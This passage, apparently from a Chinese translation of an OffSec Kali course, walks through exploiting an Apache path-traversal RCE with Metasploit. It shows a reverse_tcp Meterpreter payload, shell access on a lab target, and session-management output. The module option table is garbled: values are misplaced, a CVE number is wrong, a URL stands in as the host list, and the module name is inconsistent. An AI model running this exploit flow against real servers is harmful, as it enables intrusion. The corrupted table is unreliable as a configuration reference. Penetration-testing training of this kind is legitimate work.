
Module options (exploit/multi/http/apache_normalize_rce):

| 名称 | 当前 | 必须 | 描述 |
| :--- | :--- | :--- | :--- |
| CVE | CVE-2021-4177 | yes | 使用的漏洞 (Accepted: CVE-2021-) |
| DEPTH | 2021-42013) | 5 | 路径遍历 |
| Proxies | | no | 代理链格式 |
| type:host[port,type:host][...] | | yes | 目标(s), |
| HOSTS | https://github.com/rapid/metasploit-framework/wiki/Using-Metasploit | yes | 目标端口 (TCP) |
| RPORT | 443 | | |
| SSL | | true | 为输出连接协商 SSL/TLS |
| TARGETURI | /cgi-bin | yes | 基础路径 |
| VHOST | | no | HTTP 服务器虚拟主机 |

Payload options (linux/x64/meterpreter/reverse_tcp):

| 名称 | 当前 | 必须 | 描述 |
| :--- | :--- | :--- | :--- |
| LHOST | | yes | 目标主机 |
| LPORT | | yes | 目标端口 |

# 使用 Kali Linux 进行 OffSec 渗透测试

`uid=1(daemon) gid=1(daemon) groups=1(daemon)`

## 列表 645 - 运行利用程序

一旦启动，利用程序首先会在端口 `4444` 上启动一个监听器，并使用先前的辅助模块检查目标是否存在漏洞。在我们的案例中，如 `645` 所示，目标是有漏洞的。然后，利用该漏洞并发送有效负载（`payload`）。控制台显示已打开一个会话，我们已经获得了命令执行权限。

在进入下一节之前，让我们先探索 Metasploit 中会话（`sessions`）和任务（`jobs`）的概念。会话用于交互和管理对被攻击目标的访问，而任务则用于在后台运行模块或功能。

当我们带有会话选项启动利用程序时，会创建一个会话，我们获得了一个交互式 `shell`。我们可以通过按下 `Ctrl+Z` 并确认提示将会话发送到后台。会话进入后台后，我们可以使用 `sessions -l` 列出所有会话。

```
^Z Background session 2? [y/N] y

msf6 exploit(multi/http/apache_normalize_path_race) > sessions -l

Active sessions =

Id Name Type                 Information Connection

=============================================================

..      shell x64/linux             192.168.119.4:4444 -> 192.168.50.16:35533

(192.168.50.16)
```

## 列表 646 - 将会话放入后台并列出所有活动会话

输出提供了有关目标和所用有效负载的信息。这使我们很容易识别哪个会话管理着对目标的访问。

我们可以通过将会话传递给 `sessions -i` 来与其交互。

```
msf6 exploit(multi/http/apache_normalize_path_race) > sessions -i 2

[*] Starting interaction with 2...
```

```
uname -a

Linux cdbace7bab77 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```
